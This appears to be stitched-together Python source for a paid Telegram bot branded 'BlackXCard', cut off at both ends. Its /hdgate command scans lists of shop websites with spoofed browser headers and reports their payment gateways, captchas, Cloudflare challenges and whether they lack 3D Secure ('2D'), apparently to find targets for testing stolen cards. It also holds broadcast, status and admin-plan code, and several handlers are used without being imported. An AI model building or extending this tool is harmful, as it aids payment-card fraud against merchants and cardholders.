    status_text = escape_markdown(f"𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(urls)} site(s) 🔎...", version=2)
    bullet = "⩙"
    bullet_link = f"[{escape_markdown(bullet, version=2)}]({BULLET_GROUP_LINK})"
    processing_text = f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n{bullet_link} {status_text}\n"

    msg = await update.message.reply_text(
        processing_text,
        parse_mode="MarkdownV2",
        disable_web_page_preview=True
    )

    # Consume credits for all URLs
    if not await consume_credits(user_id, required_credits):
        await msg.edit_text(
            escape_markdown(f"❌ Failed to consume {required_credits} credits.", version=2),
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
        return

    # Fetch all sites concurrently
    await init_session()
    tasks = [fetch_site(url) for url in urls]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    # Process results
    output = ["◇━━〔 𝑳𝒐𝒐𝒌𝒖𝒑 𝑹𝒆𝒔𝒖𝒍𝒕𝒔 〕━━◇"]
    for i, (url, result) in enumerate(zip(urls, results)):
        await asyncio.sleep(0)  # Yield for responsiveness
        if isinstance(result, Exception) or result[0] is None:
            output.append(
                f"{bullet_link} 𝐒𝐢𝐭𝐞 {i+1}: `{escape_markdown(url, version=2)}`\n"
                f"{bullet_link} 𝐑𝐞𝐬𝐮𝐥𝐭 ➵ `{escape_markdown('Cannot access site', version=2)}`\n"
                f"――――――――――――――――"
            )
            continue

        status, html, headers = result
        cms = detect_cms(html)
        security = detect_security(html)
        gateways = detect_gateways(html)
        captcha = detect_captcha(html)
        cloudflare = detect_cloudflare(html, headers=headers, status=status)
        graphql = detect_graphql(html)

        output.append(
            f"{bullet_link} 𝐒𝐢𝐭𝐞 {i+1}: `{escape_markdown(url, version=2)}`\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➵ _{escape_markdown(gateways, version=2)}_\n"
            f"{bullet_link} 𝐂𝐌𝐒 ➵ `{escape_markdown(cms, version=2)}`\n"
            f"{bullet_link} 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➵ `{escape_markdown(captcha, version=2)}`\n"
            f"{bullet_link} 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➵ `{escape_markdown(cloudflare, version=2)}`\n"
            f"{bullet_link} 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➵ `{escape_markdown(security, version=2)}`\n"
            f"{bullet_link} 𝐆𝐫𝐚𝐩𝐡𝐐𝐋 ➵ `{escape_markdown(graphql, version=2)}`\n"
            f"――――――――――――――――"
        )

    # Add requester and developer info
    user = update.effective_user
    requester_clickable = f"[{escape_markdown(user.first_name, version=2)}](tg://user?id={user.id})"
    developer_clickable = "[𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™](https://t.me/+EwCcMzxhQ6Y3MTQ0)"
    output.append(
        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester_clickable}\n"
        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}"
    )

    # Join output and edit message
    final_output = "\n".join(output)
    await msg.edit_text(
        final_output,
        parse_mode="MarkdownV2",
        disable_web_page_preview=True
    )




import re
import aiohttp
import asyncio
import html
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from urllib.parse import urlparse
from bs4 import BeautifulSoup

# CMS patterns
CMS_PATTERNS = {
    'Shopify': r'cdn\.shopify\.com|shopify\.js',
    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
    'Wix': r'static\.parastorage\.com|wix\.com',
    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
    'WooCommerce': r'wp-content/plugins/woocommerce/',
    'Magento': r'static/version\d+/frontend/|magento/',
    'PrestaShop': r'prestashop\.js|prestashop/',
    'OpenCart': r'catalog/view/theme|opencart/',
    'Shopify Plus': r'shopify-plus|cdn\.shopifycdn\.net/',
    'Salesforce Commerce Cloud': r'demandware\.edgesuite\.net/',
    'WordPress': r'wp-content|wp-includes/',
    'Joomla': r'media/jui|joomla\.js|media/system/js|joomla\.javascript/',
    'Drupal': r'sites/all/modules|drupal\.js/|sites/default/files|drupal\.settings\.js/',
    'TYPO3': r'typo3temp|typo3/',
    'Concrete5': r'concrete/js|concrete5/',
    'Umbraco': r'umbraco/|umbraco\.config/',
    'Sitecore': r'sitecore/content|sitecore\.js/',
    'Kentico': r'cms/getresource\.ashx|kentico\.js/',
    'Episerver': r'episerver/|episerver\.js/',
    'Custom CMS': r'(?:<meta name="generator" content="([^"]+)")'
}

# Security patterns
SECURITY_PATTERNS = {
    '3D Secure': r'3d_secure|threed_secure|secure_redirect',
}

# Payment gateways list
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",
    "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
    "paycomet", "geomerchant", "realexpayments", "Razorpay",
    "Apple Pay", "Google Pay", "Samsung Pay", "Cash App",
    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
    "Touch n Go", "GoPay", "JKOPay", "EasyPaisa",
    "Paytm", "UPI", "PayU", "PayUBiz", "PayUMoney", "CCAvenue",
    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
    "Kushki", "RuPay", "BharatPe", "Midtrans", "MOLPay",
    "iPay88", "KakaoPay", "Toss Payments", "NaverPay",
    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "BillDesk",
    "Citrus Pay", "RazorpayX", "Cashfree",
    "Klarna", "Affirm", "Afterpay",
    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
    "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",
    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
    "Binance Pay", "CoinsPaid", "BitGo", "Flexa",
    "ACI Worldwide", "Bank of America Merchant Services",
    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
    "Discover Network", "UnionPay", "JCB Payment Gateway",
]

# Assuming db.py provides get_user and update_user
from db import get_user, update_user

BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"

# --- Shared aiohttp session ---
session: aiohttp.ClientSession = None

async def init_session():
    global session
    if session is None or session.closed:
        session = aiohttp.ClientSession()

async def close_session():
    global session
    if session and not session.closed:
        await session.close()

# --- Credit consumption ---
async def consume_credits(user_id: int, required_credits: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) >= required_credits:
        await update_user(user_id, credits=user_data["credits"] - required_credits)
        return True
    return False

# --- Fetch site ---
async def fetch_site(url: str):
    await init_session()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    domain = urlparse(url).netloc

    headers = {
        "authority": domain,
        "scheme": "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/140.0.0.0 Mobile Safari/537.36",
    }

    try:
        async with session.get(url, headers=headers, timeout=15) as resp:
            text = await resp.text()
            return resp.status, text, resp.headers
    except Exception:
        return None, None, None

# --- Detection functions ---
def detect_cms(html: str):
    for cms, pattern in CMS_PATTERNS.items():
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            if cms == 'Custom CMS':
                return match.group(1) or "Custom CMS"
            return cms
    return "Unknown"

def detect_security(html: str):
    patterns_3ds = [
        r'3d\s*secure',
        r'verified\s*by\s*visa',
        r'mastercard\s*securecode',
        r'american\s*express\s*safekey',
        r'3ds',
        r'3ds2',
        r'acsurl',
        r'pareq',
        r'three-domain-secure',
        r'secure_redirect',
    ]
    for pattern in patterns_3ds:
        if re.search(pattern, html, re.IGNORECASE):
            return "3D Secure Detected ✅"
    return "2D (No 3D Secure Found ❌)"

def detect_gateways(html: str):
    detected = []
    for gateway in PAYMENT_GATEWAYS:
        pattern = r'\b' + re.escape(gateway) + r'\b'
        if re.search(pattern, html, re.IGNORECASE):
            detected.append(gateway)
    return ", ".join(detected) if detected else "None Detected"

def detect_captcha(html: str):
    html_lower = html.lower()
    if "hcaptcha" in html_lower:
        return "hCaptcha Detected ✅"
    elif "recaptcha" in html_lower or "g-recaptcha" in html_lower:
        return "reCAPTCHA Detected ✅"
    elif "captcha" in html_lower:
        return "Generic Captcha Detected ✅"
    return "No Captcha Detected"

def detect_cloudflare(html: str, headers=None, status=None):
    if headers is None:
        headers = {}
    lower_keys = [k.lower() for k in headers.keys()]
    server = headers.get('Server', '').lower()
    cloudflare_indicators = [
        r'cloudflare',
        r'cf-ray',
        r'cf-cache-status',
        r'cf-browser-verification',
        r'__cfduid',
        r'cf_chl_',
        r'checking your browser',
        r'enable javascript and cookies',
        r'ray id',
        r'ddos protection by cloudflare',
    ]
    if 'cf-ray' in lower_keys or 'cloudflare' in server or 'cf-cache-status' in lower_keys:
        soup = BeautifulSoup(html, 'html.parser')
        title = soup.title.string.strip().lower() if soup.title else ''
        challenge_indicators = [
            "just a moment",
            "attention required",
            "checking your browser",
            "enable javascript and cookies to continue",
            "ddos protection by cloudflare",
            "please wait while we verify",
        ]
        if any(indicator in title for indicator in challenge_indicators):
            return "Cloudflare Verification Detected ✅"
        if any(re.search(pattern, html, re.IGNORECASE) for pattern in cloudflare_indicators):
            return "Cloudflare Verification Detected ✅"
        if status in (403, 503) and 'cloudflare' in html.lower():
            return "Cloudflare Verification Detected ✅"
        return "Cloudflare Present (No Verification) 🔍"
    return "None"

def detect_graphql(html: str):
    if re.search(r'/graphql|graphqlendpoint|apollo-client|query\s*\{|mutation\s*\{', html, re.IGNORECASE):
        return "GraphQL Detected ✅"
    return "No GraphQL Detected ❌"

# Background processing function
async def process_sites_background(update: Update, context: ContextTypes.DEFAULT_TYPE, msg, urls, user_id):
    try:
        # Create bullet link
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'
        
        # Process sites in batches of 5
        await init_session()
        batch_size = 5
        for batch_start in range(0, len(urls), batch_size):
            batch_urls = urls[batch_start:batch_start + batch_size]
            tasks = [fetch_site(url) for url in batch_urls]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Process batch results
            output = [f"◇━━〔 𝑳𝒐𝒐𝒌𝒖𝒑 𝑹𝒆𝒔𝒖𝒍𝒕𝒔 (Sites {batch_start + 1}-{min(batch_start + batch_size, len(urls))}) 〕━━◇"]
            for i, (url, result) in enumerate(zip(batch_urls, results)):
                site_number = batch_start + i + 1
                await asyncio.sleep(0)  # Yield for responsiveness
                if isinstance(result, Exception) or result[0] is None:
                    output.append(
                        f"{bullet_link} 𝐒𝐢𝐭𝐞 <code>{html.escape(str(site_number))}: {html.escape(url)}</code>\n"
                        f"{bullet_link} 𝐑𝐞𝐬𝐮𝐥𝐭 ➵ <code>{html.escape('Cannot access site')}</code>\n"
                        f"――――――――――――――――"
                    )
                    continue

                status, html_content, headers = result
                cms = detect_cms(html_content)
                security = detect_security(html_content)
                gateways = detect_gateways(html_content)
                captcha = detect_captcha(html_content)
                cloudflare = detect_cloudflare(html_content, headers=headers, status=status)
                graphql = detect_graphql(html_content)

                output.append(
                    f"{bullet_link} 𝐒𝐢𝐭𝐞 <code>{html.escape(str(site_number))}: {html.escape(url)}</code>\n"
                    f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➵ <i>{html.escape(gateways)}</i>\n"
                    f"{bullet_link} 𝐂𝐌𝐒 ➵ <code>{html.escape(cms)}</code>\n"
                    f"{bullet_link} 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➵ <code>{html.escape(captcha)}</code>\n"
                    f"{bullet_link} 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➵ <code>{html.escape(cloudflare)}</code>\n"
                    f"{bullet_link} 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➵ <code>{html.escape(security)}</code>\n"
                    f"{bullet_link} 𝐆𝐫𝐚𝐩𝐡𝐐𝐋 ➵ <code>{html.escape(graphql)}</code>\n"
                    f"――――――――――――――――"
                )

            # Add requester and developer info
            user = update.effective_user
            requester_clickable = f'<a href="tg://user?id={user.id}">{html.escape(user.first_name)}</a>'
            developer_clickable = '<a href="https://t.me/+EwCcMzxhQ6Y3MTQ0">𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™</a>'
            output.append(
                f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester_clickable}\n"
                f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}"
            )

            # Send batch results
            final_output = "\n".join(output)
            await update.message.reply_text(
                final_output,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

            # Update the processing message to show progress
            progress = min(batch_start + batch_size, len(urls))
            status_text = f"𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(urls)} site(s) 🔎... ({progress}/{len(urls)} completed)"
            processing_text = f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n{bullet_link} {html.escape(status_text)}\n"
            await msg.edit_text(
                processing_text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

            # Small delay to avoid overwhelming Telegram API
            await asyncio.sleep(1)

        # Finalize processing message
        await msg.edit_text(
            f"✅ Completed scanning {len(urls)} site(s).",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    
    except Exception as e:
        # Handle any errors in background processing
        error_text = f"❌ Error during processing: {html.escape(str(e))}"
        await msg.edit_text(
            error_text,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

async def hdgate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /hdgate <site_url1> [site_url2] ... [site_url100]")
        return

    user_id = update.effective_user.id
    # Filter out leading numbers (e.g., "9.", "30.") and clean URLs
    urls = [re.sub(r'^\d+\.\s*', '', url.strip()) for url in context.args[:100]]  # Limit to 100 URLs
    # Remove empty URLs
    urls = [url for url in urls if url]
    
    if not urls:
        await update.message.reply_text("No valid URLs provided.")
        return
        
    required_credits = len(urls)

    # Check if user has enough credits
    user_data = await get_user(user_id)
    if not user_data or user_data.get("credits", 0) < required_credits:
        await update.message.reply_text(
            f"❌ You need {required_credits} credits to scan {required_credits} site(s).",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return

    # Consume credits immediately
    if not await consume_credits(user_id, required_credits):
        await update.message.reply_text(
            f"❌ Failed to consume {required_credits} credits.",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return

    # Create bullet link
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'
    
    # Send initial processing message
    status_text = f"𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(urls)} site(s) 🔎..."
    processing_text = f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n{bullet_link} {html.escape(status_text)}\n"
    msg = await update.message.reply_text(
        processing_text,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

    # Create background task for processing
    asyncio.create_task(process_sites_background(update, context, msg, urls, user_id))



import asyncio
import html
import logging
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
import db  # your db.py

# Configure logging for detailed errors
logger = logging.getLogger(__name__)

# ==================== BROADCAST SYSTEM ====================
import asyncio
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import Forbidden, BadRequest, TimedOut, RetryAfter, NetworkError

broadcast_states = {}  # Store broadcast state for owner

async def broad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start broadcast process"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    # Set state to waiting for message
    user_id = update.effective_user.id
    broadcast_states[user_id] = {'step': 'waiting_for_message'}
    
    await update.message.reply_text(
        "📢 *BROADCAST SYSTEM*\n\n"
        "Send me the message you want to broadcast:\n"
        "(Text, photo, video, document, etc.)\n\n"
        "Type `/cancel` to stop",
        parse_mode="Markdown"
    )

async def broadcast_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle messages when owner is in broadcast mode"""
    user_id = update.effective_user.id
    
    # Only process if owner is in broadcast mode
    if user_id not in broadcast_states:
        return
    
    current_state = broadcast_states[user_id]
    
    # Handle cancel command
    if update.message.text and update.message.text.lower() == '/cancel':
        del broadcast_states[user_id]
        await update.message.reply_text("❌ Broadcast cancelled.")
        return
    
    if current_state['step'] == 'waiting_for_message':
        # Store the message
        message_to_broadcast = update.message
        broadcast_states[user_id] = {
            'step': 'confirmation',
            'message': message_to_broadcast
        }
        
        # Create preview
        preview = ""
        if message_to_broadcast.text:
            text = message_to_broadcast.text
            if len(text) > 200:
                text = text[:200] + "..."
            preview = f"📝 *Text Message:*\n\n{text}"
        elif message_to_broadcast.caption:
            caption = message_to_broadcast.caption
            if len(caption) > 200:
                caption = caption[:200] + "..."
            media_type = message_to_broadcast.content_type.upper()
            preview = f"📸 *{media_type} with Caption:*\n\n{caption}"
        else:
            media_type = message_to_broadcast.content_type.upper()
            preview = f"📁 *{media_type} File*"
        
        # Ask for confirmation
        await update.message.reply_text(
            f"{preview}\n\n"
            "✅ *Send this to all users?*\n\n"
            "Click below to confirm:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ YES, SEND TO ALL", callback_data="broadcast_confirm")],
                [InlineKeyboardButton("❌ NO, CANCEL", callback_data="broadcast_cancel")]
            ])
        )

async def handle_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle broadcast callback buttons"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "broadcast_confirm":
        if user_id in broadcast_states and broadcast_states[user_id]['step'] == 'confirmation':
            message_to_send = broadcast_states[user_id]['message']
            del broadcast_states[user_id]
            
            await query.edit_message_text("🚀 *Starting broadcast...*", parse_mode="Markdown")
            asyncio.create_task(send_broadcast_to_all(query, context, message_to_send))
        else:
            await query.edit_message_text("❌ No message found. Start again with `/broad`")
    
    elif data == "broadcast_cancel":
        if user_id in broadcast_states:
            del broadcast_states[user_id]
        await query.edit_message_text("❌ Broadcast cancelled.")

async def send_broadcast_to_all(update: Update, context: ContextTypes.DEFAULT_TYPE, message):
    """Forward message to all users"""
    # Get all users from database
    users = await db.get_all_users()
    total_users = len(users)
    
    if total_users == 0:
        await update.message.reply_text("❌ No users in database.")
        return
    
    sent = 0
    blocked = 0
    failed = 0
    
    # Send initial progress
    progress_msg = await update.message.reply_text(
        f"📤 *Broadcast Progress*\n"
        f"──────────────\n"
        f"👥 Total Users: `{total_users}`\n"
        f"✅ Sent: `0`\n"
        f"🚫 Blocked: `0`\n"
        f"❌ Failed: `0`\n"
        f"⏱️ Progress: `0%`",
        parse_mode="Markdown"
    )
    
    start_time = time.time()
    
    for i, user in enumerate(users, 1):
        user_id = user["id"]
        
        try:
            # ✅ FORWARD THE MESSAGE (not copy-paste)
            await message.forward(chat_id=user_id)
            sent += 1
            
        except Forbidden:
            # User blocked the bot
            blocked += 1
        except (BadRequest, TimedOut, RetryAfter, NetworkError):
            failed += 1
        except Exception as e:
            failed += 1
            logger.error(f"Error sending to user {user_id}: {e}")
        
        # Update progress every 20 users or 5 seconds
        if i % 20 == 0 or i == total_users:
            progress = (i / total_users) * 100
            elapsed = time.time() - start_time
            
            try:
                await progress_msg.edit_text(
                    f"📤 *Broadcast Progress*\n"
                    f"──────────────\n"
                    f"👥 Total Users: `{total_users}`\n"
                    f"✅ Sent: `{sent}`\n"
                    f"🚫 Blocked: `{blocked}`\n"
                    f"❌ Failed: `{failed}`\n"
                    f"⏱️ Progress: `{progress:.1f}%`\n"
                    f"⏰ Time: `{elapsed:.1f}s`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        
        # Small delay to avoid rate limits
        await asyncio.sleep(0.03)
    
    # Final report
    elapsed = time.time() - start_time
    success_rate = (sent / total_users * 100) if total_users > 0 else 0
    
    await progress_msg.edit_text(
        f"✅ *BROADCAST COMPLETE!*\n"
        f"──────────────\n"
        f"📊 *Statistics:*\n"
        f"👥 Total Users: `{total_users}`\n"
        f"✅ Successfully Sent: `{sent}`\n"
        f"🚫 Blocked/Deleted: `{blocked}`\n"
        f"❌ Failed: `{failed}`\n"
        f"📈 Success Rate: `{success_rate:.1f}%`\n"
        f"⏰ Time Taken: `{elapsed:.1f} seconds`\n\n"
        f"🔄 Use `/broad` again to send another message",
        parse_mode="Markdown"
    )
    
    logger.info(f"Broadcast completed: {sent}/{total_users} users in {elapsed:.1f}s")

# ==================== MESSAGE FILTER ====================
async def filter_owner_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Filter messages from owner for broadcast system"""
    user_id = update.effective_user.id
    
    # Only process owner messages
    if user_id != OWNER_ID:
        return
    
    # Check if owner is in broadcast mode
    if user_id in broadcast_states:
        await broadcast_message_handler(update, context)

# ==================== REGISTER BROADCAST HANDLERS ====================
def register_broadcast_handlers(application):
    """Register all broadcast handlers"""
    # Command handler
    application.add_handler(CommandHandler("broad", broad))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(handle_broadcast_callback, pattern="^broadcast_"))
    
    # Message filter for owner - SIMPLE VERSION
    application.add_handler(
        MessageHandler(
            filters.ALL & ~filters.COMMAND,  # ✅ All non-command messages
            filter_owner_messages
        ),
        group=1
    )


import psutil
import platform
import socket
from datetime import datetime
import time
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Clickable bullet
BULLET_LINK = '<a href="https://t.me/+EwCcMzxhQ6Y3MTQ0">⩙</a>'

async def get_total_users():
    from db import get_all_users
    users = await get_all_users()
    return len(users)

def get_uptime() -> str:
    boot_time = psutil.boot_time()
    uptime_seconds = int(time.time() - boot_time)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # CPU info
    cpu_usage = psutil.cpu_percent(interval=1)
    cpu_count = psutil.cpu_count(logical=True)
    cpu_model = platform.processor() or "N/A"

    # RAM info
    memory = psutil.virtual_memory()
    total_memory = memory.total / (1024 ** 3)  # GB
    used_memory = memory.used / (1024 ** 3)
    available_memory = memory.available / (1024 ** 3)
    memory_percent = memory.percent

    # Swap info
    swap = psutil.swap_memory()
    total_swap = swap.total / (1024 ** 3)
    used_swap = swap.used / (1024 ** 3)
    swap_percent = swap.percent

    # Disk info
    disk = psutil.disk_usage("/")
    total_disk = disk.total / (1024 ** 3)  # GB
    used_disk = disk.used / (1024 ** 3)
    free_disk = disk.free / (1024 ** 3)
    disk_percent = disk.percent

    # Host/VPS info
    hostname = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()
    architecture = platform.machine()

    # Uptime
    uptime_str = get_uptime()

    # Current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Total users
    total_users = await get_total_users()

    # Final message
    status_message = (
        f"✦━━━[ 𝐁𝐨𝐭 & 𝐕𝐏𝐒 𝐒𝐭𝐚𝐭𝐮𝐬 ]━━━✦\n"
        f"{BULLET_LINK} 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <code>Active ✅</code>\n"
        f"{BULLET_LINK} 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <code>{os_name} {os_version}</code>\n"
        f"{BULLET_LINK} 𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞 ➳ <code>{architecture}</code>\n"
        "――――――――――――――――\n"
        f"{BULLET_LINK} 𝐂𝐏𝐔 ➳ <code>{cpu_usage:.1f}% ({cpu_count} cores)</code>\n"
        f"{BULLET_LINK} 𝐑𝐀𝐌 ➳ <code>{used_memory:.2f}GB / {total_memory:.2f}GB ({memory_percent:.1f}%)</code>\n"
        f"{BULLET_LINK} 𝐑𝐀𝐌 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <code>{available_memory:.2f}GB</code>\n"
        f"{BULLET_LINK} 𝐃𝐢𝐬𝐤 ➳ <code>{used_disk:.2f}GB / {total_disk:.2f}GB ({disk_percent:.1f}%)</code>\n"
        f"{BULLET_LINK} 𝐃𝐢𝐬𝐤 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <code>{free_disk:.2f}GB</code>\n"
        "――――――――――――――――\n"
        f"{BULLET_LINK} 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬 ➳ <code>{total_users}</code>\n"
        f"{BULLET_LINK} 𝐔𝐩𝐭𝐢𝐦𝐞 ➳ <code>{uptime_str}</code>\n"
        f"{BULLET_LINK} 𝐓𝐢𝐦𝐞 ➳ <code>{current_time}</code>\n"
        f"{BULLET_LINK} 𝐁𝐨𝐭 𝐁𝐲 ➳ <a href='tg://resolve?domain=BlinkCarder'>𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™</a>\n"
        "――――――――――――――――"
    )

    await update.effective_message.reply_text(
        status_message,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )




# === OWNER-ONLY COMMANDS ===
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import AUTHORIZED_CHATS
from db import get_all_users  # Ensure this exists in db.py

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all admin commands, authorized groups, and private plan users."""

    admin_commands_list = (
        "• `/give_starter <user_id>`: Give 7\\-day Starter Plan\n"
        "• `/give_premium <user_id>`: Give 30\\-day Premium Plan\n"
        "• `/give_plus <user_id>`: Give 60\\-day Plus Plan\n"
        "• `/give_custom <user_id>`: Give Custom Plan\n"
        "• `/take_plan <user_id>`: Remove plan & private access\n"
        "• `/au <chat_id>`: Authorize a group\n"
        "• `/rauth <user_id>`: Remove private user auth\n"
        "• `/gen_codes`: Generate 10 Starter Plan codes"
    )

    # Authorized Groups
    authorized_groups_list = []
    for chat_id in AUTHORIZED_CHATS:
        try:
            chat = await context.bot.get_chat(chat_id)
            name = escape_markdown_v2(chat.title or "N/A")
        except Exception:
            name = "Unknown or Left Group"
        escaped_id = escape_markdown_v2(str(chat_id))
        authorized_groups_list.append(f"• `{escaped_id}` → *{name}*")
    authorized_groups_str = (
        "\n".join(authorized_groups_list) if authorized_groups_list else "_No groups authorized\\._"
    )

    # Private plan users
    users = await get_all_users()
    plan_users = []
    for user in users:
        plan = user.get("plan", "Free")
        if plan.lower() not in ["free", "n/a"]:
            uid = escape_markdown_v2(str(user["id"]))
            plan_escaped = escape_markdown_v2(plan)
            plan_users.append(f"• ID: `{uid}` \\| Plan: `{plan_escaped}`")
    authorized_users_str = (
        "\n".join(plan_users) if plan_users else "_No private users with plans\\._"
    )

    admin_dashboard_message = (
        "╭━━━━━『 𝐀𝐃𝐌𝐈𝐍 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃 』━━━━━╮\n"
        "┣ 🤖 *Owner Commands:*\n"
        f"{admin_commands_list}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬 』━━━╮\n"
